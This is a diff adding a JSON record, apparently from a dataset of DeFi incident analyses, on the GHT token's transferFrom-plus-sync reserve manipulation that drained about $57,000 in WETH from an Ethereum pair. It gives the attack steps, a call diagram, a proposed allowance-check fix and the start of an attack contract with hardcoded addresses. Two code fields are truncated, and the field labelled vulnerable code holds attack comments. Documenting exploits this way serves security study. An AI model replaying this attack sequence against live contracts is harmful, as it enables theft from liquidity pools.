@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-03-XX_GHT_TransferFromSyncManipulation",
+ "source_file": "2024/2024-03-XX_GHT_TransferFromSyncManipulation.md",
+ "title": "GHT — transferFrom + sync Reserve Manipulation Vulnerability Analysis",
+ "date": "2024-03-01",
+ "protocol": "GHT",
+ "chain": "Ethereum",
+ "loss_raw": "~$57,000",
+ "loss_usd": 57000.0,
+ "root_cause": "Used GHT token's `transferFrom()` to drain the pair balance down to 1, called `sync()` to update reserves, then transferred a large amount of GHT back and exploited the price discrepancy via `swap()` to drain WETH",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: transferFrom allows direct withdrawal from pair balance\ninterface IGHT {\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface Uni_Pair_V2 {\n    function sync() external;\n    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\n// GHT.transferFrom(pair, attacker, balance-1) → pair balance = 1\n// pair.sync() → reserve = 1\n// GHT.transfer(pair, balance-1) → pair balance = balance\n// reserve = 1 but actual balance = balance → extreme mismatch\n// pair.swap(WETH_amount, 0, attacker, \"\") → large WETH withdrawal\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code: enforce strict transferFrom caller validation\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool) {\n    // Allow balance transfer from `from` only via allowance mechanism\n    // Special validation required when pair contract is the `from` address\n    require(allowance[from][msg.sender] >= amount, \"insufficient allowance\");\n    allowance[from][msg.sender] -= amount;\n    _transfer(from, to, amount);\n    return true;\n}"
+ ],
+ "steps": [
+  "→ [1] GHT.transferFrom(pair, attacker, pairBalance - 1)",
+  "→ [2] pair.sync()",
+  "→ [3] GHT.transferFrom(attacker, pair, pairBalance - 1)",
+  "→ [4] pair.swap(wethOut, 0, attacker, \"\")",
+  "→ [5] ~$57K WETH profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] GHT.transferFrom(pair, attacker, pairBalance - 1)\n  │         └─ Pair GHT balance reduced to 1\n  │\n  ├─→ [2] pair.sync()\n  │         └─ reserve_GHT updated to 1\n  │\n  ├─→ [3] GHT.transferFrom(attacker, pair, pairBalance - 1)\n  │         └─ Pair GHT actual balance = pairBalance\n  │         └─ Reserve = 1 vs actual balance = pairBalance (extreme mismatch)\n  │\n  ├─→ [4] pair.swap(wethOut, 0, attacker, \"\")\n  │         └─ Excessive WETH extracted based on reserve mismatch\n  │\n  └─→ [5] ~$57K WETH profit",
+  "interface IGHT {\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface Uni_Pair_V2 {\n    function sync() external;\n    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    IGHT        constant GHT  = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);\n    Uni_Pair_V2 constant pair = Uni_Pair_V2(0x706206EabD6A70ca4992eEc1646B6D1599259CAe);\n    IERC20      constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    function testExploit() external {\n        // [1] Drain nearly all GHT from the pair\n        u"
+ ]
+}
